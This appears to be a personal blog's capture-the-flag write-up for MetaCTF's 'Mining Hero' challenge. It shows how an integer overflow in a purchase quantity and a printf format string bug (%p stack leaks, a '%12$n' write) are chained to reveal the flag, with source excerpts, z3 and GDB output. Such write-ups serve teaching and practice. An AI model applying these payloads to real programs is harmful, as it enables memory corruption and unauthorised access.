---
layout: post
title: "Mining Hero Vulnerabilities"
date: 2020-10-25
---

[Mining Hero](../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp) (click [here](../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game) for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.

When I compiled the binary, `g++` immediately told me that there was a format string vulnerability in the code. This information will become useful later.
```bash
$ g++ -fno-stack-protector -g -Wall -o text-game text-game.cpp
text-game.cpp: In function ‘void purchase()’:
text-game.cpp:150:34: warning: operation on ‘tools_left’ may be undefined [-Wsequence-point]
  150 |    << "now have " << (tools_left += count - 1) << " spare tool"
      |                      ~~~~~~~~~~~~^~~~~~~~~~~~~
text-game.cpp:161:41: warning: suggest parentheses around comparison in operand of ‘&’ [-Wparentheses]
  161 |   bool god_is_happy = rand() & 0xFFFFFF == 0;
      |                                ~~~~~~~~~^~~~
text-game.cpp:164:22: warning: format not a string literal and no format arguments [-Wformat-security]
  164 |   printf(name.c_str());
```

When I first played the game, I was given four different options.
```
$ ./text-game 
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
Nihaal
Current funds: $150
Your options are: 
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

Selecting option two is the only reliable way to make more money. The downside to using this option is that it pauses the program for a moment (by calling the `usleep()` function), making it difficult to brute-force the program using only this option.
```
2
You go to work in the mines
[..........]
[=.........]
[==........]
[===.......]
[====......]
[=====.....]
[======....]
[=======...]
[========..]
[=========.]
[==========]
It was a normal days work. You earned $7. Your balance is now $157.
Current funds: $157
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

Option one gives you a chance to double your money.
```
1
A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
heads
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 157.
157
... and the coin came up heads!! You just got $157! Congratulations! Your balance is $314
Current funds: $314
Your options are: 
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

Option three is interesting. It allows us to buy various things that could either allow us to mine things faster (encouragement) or get more money while mining (tools). It also includes a `shout-out-from-literally-god` option, which costs a huge sum of money.
```
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
1
You can do it! Go you!
You are now very encouraged! Your mining speed has increased.
Current funds: $294
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

Looking at the `purchase()` function in the code, it appears that our goal is to somehow buy the `shout-out-from-literally-god` option. However, even if we buy this option, there is still no guarantee that we will get the flag. The function only prints out the flag if `rand() & 0xFFFFFF` equals zero, and since there is no way for us to actually control the output of `rand()`, there is no way for us to guarantee that we get the flag even after getting a shout out from god.
```c
[...]

void purchase(){

    [...]

	} else if(option == "shout-out-from-literally-god"){
		bool god_is_happy = rand() & 0xFFFFFF == 0;
		bool* god_is_really_happy = &god_is_happy;
		printf("Hmmmm\n");
		printf(name.c_str());
		printf("\nYou have done well!\n");
		printf("Good job!\n");

		if(*god_is_really_happy){
			printf("I'm feeling generous right now!\nHave a flag!\n");
			std::ifstream t("flag.txt");
			std::string str((std::istreambuf_iterator<char>(t)),
				                 std::istreambuf_iterator<char>());
			std::cout << str << std::endl;
		}

		printf("Sincerely,\n");
		printf("\t~God\n");
	}
}

[...]
```

When looking at this block of code, one thing that I thought was strange was that the programmer made a function pointer called `bool* god_is_really_happy`. The first question that popped into my mind was, "What was the point of making this pointer?" It seems pretty much useless since the programmer could have just used `god_is_happy` in place of `*god_is_really_happy` in the if statement.

My question was answered when I looked a little bit further down and remembered the format string vulnerability. The line that says `printf(name.c_str())` prints out our name directly using `printf()` instead of using a format string (The secure way of doing this would be to use `printf("%s", name.c_str())`). We could exploit the format string vulnerability by putting string formatters in `name`.

At this point in time, we have two goals:
1. Find a vulnerability that allows us to buy the `shout-out-from-literally-god` option.
2. Exploit the format string vulnerability to write anything (other than zero) to the address `god_is_really_happy`.

Instead of doing step one, you could also try to brute-force the program until you got enough money, but I didn't go with that solution.

The first vulnerability took me a long time to see. I manually inputted various characters when the program asked for a specific type of input, and I was specifically looking for integer overflow vulnerabilities that increased my money (though, I would later find out that increasing my money was not necessary). Typing -1 when betting did not work.

```
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
1
A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
heads
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
-1
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
-1
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
```

However, when I did the same thing while buying something, the program said that I didn't have enough money to buy encouragement, even though I did. The only reasonable explanation for this behavior would be that it interprets the quantity as an unsigned integer, even though I am typing it as a signed integer.
```
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
-1
You don't have the money for that!
```

I spent a few minutes trying out a bunch of different negative numbers to see if any of them would allow me to actually buy `encouragement`. Although I was unsuccessful by simply using trial-and-error, this was enough to pique my interest, so I decided to take another look at the code for purchasing items. In the top half of the `purchase()`, we can see exactly how the quantity is interpreted.
```c
[...]

void purchase() {
    std::map<std::string, unsigned long long> prices{
        { "tool", 100 },
        { "encouragement", 20 },
        { "shout-out-from-literally-god", 1000000000000000ULL }
    };

    std::string option{};
    do {
        std::cout << "What would you like to buy? Options are ";
        for(auto& entry : prices){
            std::cout << entry.first << " (cost: " << entry.second << "), ";
        }
        std::cout << "or cancel" << std::endl;
        std::cin >> option;
        if(option == "cancel"){
            return;
        }
    } while(prices.find(option) == prices.end());

    unsigned long long count{ 0 };
    do {
        std::cout << "How many would you like to buy? Must be greater than 0" << std::endl;
        std::cin >> count;
    } while(!std::cin.good() || !count);

    auto item_cost{ prices.at(option) };
    auto total{ item_cost * count };
    if(total > player_funds) {
        std::cout << "You don't have the money for that!" << std::endl;
        return;
    }

    player_funds -= total;

    [...]

}

[...]
```

There are four variables that we care about in this code. All four of these variables are stored as `unsigned long long`, which is 64 bits on my system.
- `player_funds` - Contains our money
- `item_cost` - The price of the thing we want to buy
- `count` - The quantity that we typed in
- `total` - Equal to `item_cost * count`

What if we could input the value `count` such that `total` is something that is less than the actual price of `item`? This could allow us to buy items that we do not have enough money for. In other words, we want `count` to be a value such that `count * item_cost < player_funds`. However, we cannot simply input 0 as count because the program checks for zeros.
```
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
0
How many would you like to buy? Must be greater than 0
0
How many would you like to buy? Must be greater than 0
```

We know that we can type in signed integers and have them be interpreted as unsigned integers, so what if we tried a value for `count` that was negative? In order to find such a value for `count`, I decided to use `z3`.
```python
Python 3.8.5 (default, Jul 28 2020, 12:59:40)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from z3 import *
>>> total = BitVec('total', 64)
>>> player_funds = BitVec('player_funds', 64)
>>> item_cost = BitVec('item_cost', 64)
>>> count = BitVec('count', 64)
>>> solve(total == item_cost * count, item_cost == 1000000000000000, count < 0, ULE(total, player_funds), player_funds == 150)
[total = 0,
 count = 9223372036854775808,
 player_funds = 150,
 item_cost = 1000000000000000]
```

Let me explain how this code works. First of all, we create the four variables that we care about: `total`, `player_funds`, `item_cost`, and `count`. We initialize each of these variables by using a bit vector with 64 bits (since `unsigned long long` variables are 64 bits on my machine). We then solve the problem using the following constraints:
- Make sure that `total` is equal to `item_cost * count` because that is how `total` is calculated in the code.
- Make sure that the `item_cost` is the price of `shout-out-from-literally-god`.
- Make sure that `count` is negative so that we can actually do the integer overflow.
- Make sure that `total <= player_funds`. Note that I used `ULE()` here because it makes unsigned comparisons.
- Make sure that `player_funds` is equal to 150, which is the amount that we always start with.

The program returned a solution of `count = 9223372036854775808`. To see why this solution works, take a look at the following:
```python
>>> 1000000000000000 * 9223372036854775808
9223372036854775808000000000000000
>>> bin(1000000000000000 * 9223372036854775808)
'0b11100011010111111010100100110001101000000000000000000000000000000000000000000000000000000000000000000000000000000'
>>> len(bin(1000000000000000 * 9223372036854775808)[2:])
113
>>> bin(1000000000000000 * 9223372036854775808)[-64:]
'0000000000000000000000000000000000000000000000000000000000000000'
```

Technically, doing `total = 1000000000000000 * 9223372036854775808` returns a value that is much greater than the price. However, when we look at the binary representation of this value, we can see that the value needs 113 bits of storage, and the first 64 bits are all zeros. When we use this value as the quantity, we end up only storing 64 bits of zeros in the program. Using this value lets us buy a shout out from god.

```
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
Nihaal
You have done well!
Good job!
Sincerely,
	~God
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

Now we just need to exploit the format string vulnerability that we saw earlier. Using GDB, I set a breakpoint at the location where the format string vulnerability occurred, and I printed out the address of the value that I wanted to change.

```
Breakpoint 1, purchase () at text-game.cpp:164
164         printf(name.c_str());
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6
$rbx   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
$rcx   : 0x00007ffff7cc51e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffda70  →  0xff00ffffffffffff
$rbp   : 0x00007fffffffdd70  →  0x00007fffffffddd0  →  0x0000000000000000
$rsi   : 0x0000555555570eb0  →  "Hmmmm\nny would you like to buy? Must be greater t[...]"
$rdi   : 0x00007ffff7da24c0  →  0x0000000000000000
$rip   : 0x0000555555557569  →  <purchase()+1545> lea rdi, [rip+0x6d30]        # 0x55555555e2a0 <_Z4nameB5cxx11>
$r8    : 0x6
$r9    : 0x00007ffff7d9f240  →  0x0000000000000008
$r10   : 0x00007ffff7e1d499  →  "_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_[...]"
$r11   : 0x246
$r12   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 ("tool"?)
$r13   : 0x3
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda70│+0x0000: 0xff00ffffffffffff   ← $rsp
0x00007fffffffda78│+0x0008: 0x8000000000000000
0x00007fffffffda80│+0x0010: 0xffffffffffffffff
0x00007fffffffda88│+0x0018: 0x00007fffffffdad0  →  0x0000000000000000
0x00007fffffffda90│+0x0020: 0x00038d7ea4c68000
0x00007fffffffda98│+0x0028: 0x0000000000000000
0x00007fffffffdaa0│+0x0030: 0x00007fffffffda76  →  0x000000000000ff00
0x00007fffffffdaa8│+0x0038: 0x0000555555571750  →  0x0000555555571760  →  0x000000006c6f6f74 ("tool"?)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555557556 <purchase()+1526> mov    QWORD PTR [rbp-0x2d0], rax
   0x55555555755d <purchase()+1533> lea    rdi, [rip+0x2f6a]        # 0x55555555a4ce
   0x555555557564 <purchase()+1540> call   0x555555556620 <puts@plt>
 → 0x555555557569 <purchase()+1545> lea    rdi, [rip+0x6d30]        # 0x55555555e2a0 <_Z4nameB5cxx11>
   0x555555557570 <purchase()+1552> call   0x555555556410 <_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@plt>
   0x555555557575 <purchase()+1557> mov    rdi, rax
   0x555555557578 <purchase()+1560> mov    eax, 0x0
   0x55555555757d <purchase()+1565> call   0x555555556390 <printf@plt>
   0x555555557582 <purchase()+1570> lea    rdi, [rip+0x2f4b]        # 0x55555555a4d4
────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:text-game.cpp+164 ────
    159         tool_time = 50000;
    160     } else if(option == "shout-out-from-literally-god"){
    161         bool god_is_happy = rand() & 0xFFFFFF == 0;
    162         bool* god_is_really_happy = &god_is_happy;
    163         printf("Hmmmm\n");
 →  164         printf(name.c_str());
    165         printf("\nYou have done well!\n");
    166         printf("Good job!\n");
    167
    168         if(*god_is_really_happy){
    169             printf("I'm feeling generous right now!\nHave a flag!\n");
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "text-game", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555557569 → purchase()
[#1] 0x555555557a0d → main(argc=0x1, argv=0x7fffffffdec8)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print god_is_really_happy
$1 = (bool *) 0x7fffffffda76
```

The address was `0x7fffffffda76`, and since I had ASLR disabled on my machine, I just needed to search for the location of this address when I used a string formatter in my name. In the below example, you can see that the address `0x7fffffffda76` is the twelfth pointer being popped off of the stack.

```
Starting program: /home/n/Documents/Exploitation/metactf/Mining Hero/text-game
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
0x555555570eb0.(nil).0x7ffff7cc51e7.0x6.0x7ffff7d9f240.0x250070252e70252e.0x8000000000000000.0x2e70252e70252e70.0x7fffffffdad0.0x38d7ea4c68000.(nil).0x7fffffffda76.0x555555571720.0x555555571ef0.(nil).0x7fffffffdad8.(nil).(nil).(nil).0x555555571ef0.0x555555571ea0.0x555555571700.0x3.0x5555555716d0.0x1c.0x1e.0x2d6d6f72662d74.(nil).(nil).(nil).(nil).0x7fffffffdb50.0x4.0x6c6f6f74.(nil).0x64.0x7fffffffdb78.0xd.0x676172756f636e65.0x746e656d65.0x14.0x5555555716d0.0x1c.0x1c.(nil).0x38d7ea4c68000.(nil).0x2.0x800000000000000e.(nil).0x7ffff7c467b2.(nil).0x7ffff7e6d198.(nil).0x7ffff7da06a0.0x7ffff7fa0700.0x3.0x7ffff7f951a8.0x7ffff7f93ec0.0xff00000006.0x7ffff7c3a541.0x7ffff7d9f980.0x7ffff7d9f980.0x7ffff7da08a0.0x5d4990340e914700.(nil).0x7ffff7fa0700.(nil).0x7ffff7f951a8.0x7ffff7f93ec0.(nil).0x55555555e160.0x7ffff7e69f38.0x7ffff7fa0700.0x7fffffffdca0.0x7ffff7fa0700.0x6.0x6.0x5d4990340e914700.0x7fffffffdd2f.0x7fffffffdd30.0x7fffffffdd30.0x7ffff7f9ed00.0x33.0x33.0x7ffff7f9ed00.0x7ffff7e85176.0xa.0x3fffffffffffffff.0x7ffff7fa0700.0x1.0xf7f6f5f4f3f2f101.0x7ffff7f061ee.0x7ffff7fa0ce0.0x555555559eb0.0x7fffffffdd70.0x5d4990340e914700.0x7fffffffdec0.0x555555559eb0.0x5555555566b0.0x7fffffffdec0.0x7fffffffddd0.0x555555557a0d.0x7fffffffdec8.0x155557b43.0x7fffffffdda0.0x1.0x7ffff7da0033.0x555555559eb0.(nil).0x5d4990340e914700.0x555555559eb0.0x5555555566b0.(nil).0x7ffff7bdb0b3.0x7ffff7d9fb80.0x7fffffffdec8.0x100011c00.0x5555555577de.0x555555559eb0.0x4bf57339303d8b0.0x5555555566b0.0x7fffffffdec0.(nil).(nil).0xfb40a8cc28c3d8b0.0xfb40b848f3cdd8b0.(nil).(nil).(nil).0x1.0x7fffffffdec8.0x7fffffffded8.0x7ffff7ffe190.(nil).(nil).0x5555555566b0.0x7fffffffdec0.(nil).(nil).0x5555555566de.0x7fffffffdeb8.0x1c.0x1.0x7fffffffe243.(nil).0x7fffffffe280.0x7fffffffe290.0x7fffffffe2d8.0x7fffffffe2eb.0x7fffffffe2ff.0x7fffffffe32c.0x7fffffffe343.0x7fffffffe36f.0x7fffffffe381.0x7fffffffe3b7.0x7fffffffe3ce.0x7fffffffe3ee.0x7fffffffe402.0x7fffffffe42b.0x7fffffffe43f.0x7fffffffe456.0x7fffffffe46e.0x7fffffffe481.0x7fffffffe49d.0x7fffffffe4d4.0x7fffffffe4ef.0x7fffffff
```

This meant that if used the `%12$n` format string in my name, I would write to the twelfth address on the stack. Since the twelfth address on the stack is the `god_is_really_happy` pointer, we will be able to change the value of `god_is_happy` to true and get the flag!

```
$ nc host1.metaproblems.com 5950
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
1%12$n
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
9223372036854775808
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
1
You have done well!
Good job!
I'm feeling generous right now!
Have a flag!
MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}
Sincerely,
    ~God
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
```

{% include related_posts.html %}
